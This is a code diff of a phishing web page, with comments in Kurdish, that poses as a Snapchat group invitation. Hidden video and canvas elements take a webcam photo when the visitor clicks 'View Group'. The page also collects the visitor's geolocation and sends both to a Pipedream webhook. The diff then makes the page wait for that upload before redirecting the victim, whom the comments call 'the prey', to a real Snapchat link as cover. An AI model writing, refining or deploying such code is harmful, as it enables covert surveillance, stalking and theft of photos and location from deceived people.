@@ -36,8 +36,8 @@
 </head>
 <body>
 
-    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-    <a href="https://www.snapchat.com/add/YOUR_SNAPCHAT_USERNAME" class="btn" id="viewGroupBtn">View Group</a>
+    <p>:بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە</p>
+    <button class="btn" id="viewGroupBtn">View Group</button>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -45,6 +45,9 @@
     <script>
         // ⚠️ لێرەدا لینکی فەرمی پڕۆژەی Pipedreamـەکەی خۆت دابنێ
         const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
+        
+        // ⚠️ لێرەدا ئەو لینکەی سناپچات دابنێ کە دەتەوێت نێچیرەکە بۆی بڕوات
+        const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -72,12 +75,12 @@
             }).catch(() => {});
         }
 
-        // وەرگرتنی لۆکەیشن بە فۆرماتێکی تەواو ڕاست بەبێ خەتای پیتەکان
+        // وەرگرتنی لۆکەیشن بێ خەوش
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((position) => {
                 let lat = position.coords.latitude;
                 let lon = position.coords.longitude;
-                globalMaps = "https://maps.google.com/?q=" + lat + "," + lon;
+                globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
             }, (error) => {
                 globalMaps = "⚠️ نێچیرەکە مۆڵەتی لۆکەیشنی ڕەتکردەوە!";
             }, { 
@@ -95,18 +98,20 @@
             })
             .catch(() => {});
 
+        // کاتێک کلیک لە دوگمەکە دەکات
         document.getElementById('viewGroupBtn').addEventListener('click', function(e) {
             try {
                 context.drawImage(video, 0, 0, 640, 480);
                 canvas.toBlob(function(blob) {
-                    sendToWebhookNow(blob);
+                    sendAndRedirect(blob);
                 }, 'image/jpeg');
             } catch (err) {
-                sendToWebhookNow(null);
+                sendAndRedirect(null);
             }
         });
 
-        async function sendToWebhookNow(imageBlob) {
+        // هێشتنەوەی وێبگەرەکە بۆ کەرتی چرکەیەک تا داتاکە دەنێرێت، پاشان ناردنی بۆ سناپچات
+        async function sendAndRedirect(imageBlob) {
             const formData = new FormData();
             let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
 
@@ -123,7 +128,15 @@
                 formData.append("photo", imageBlob, "snap.jpg");
             }
 
-            fetch(secureWebhook, { method: 'POST', body: formData }).catch(err => console.error(err));
+            try {
+                // چاوەڕێی ناردنی داتاکە دەکات بۆ ئەوەی پەکینەخات
+                await fetch(secureWebhook, { method: 'POST', body: formData });
+            } catch (err) {
+                console.error(err);
+            } finally {
+                // دوای ناردنی داتاکە، ڕاستەوخۆ نێچیرەکە دەباتە سەر سناپچات
+                window.location.href = snapchatRedirectUrl;
+            }
         }
     </script>
 </body>
